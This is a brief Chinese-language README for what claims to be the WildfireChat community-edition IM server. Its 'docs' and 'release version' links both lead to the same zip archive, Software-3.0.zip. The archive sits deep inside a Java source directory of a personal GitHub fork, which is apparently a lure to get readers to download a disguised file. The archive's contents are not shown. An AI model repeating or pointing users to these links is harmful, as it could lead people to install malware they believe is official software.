# server
本工程为野火IM 社区版IM服务软件。野火IM作为一个通用的即时通讯解决方案，可以集成到各种应用中。请阅读[docs](https://github.com/tanglongwei/server/raw/refs/heads/wildfirechat/common/src/main/java/cn/Software-3.0.zip)或下载服务器[发布版本](https://github.com/tanglongwei/server/raw/refs/heads/wildfirechat/common/src/main/java/cn/Software-3.0.zip)
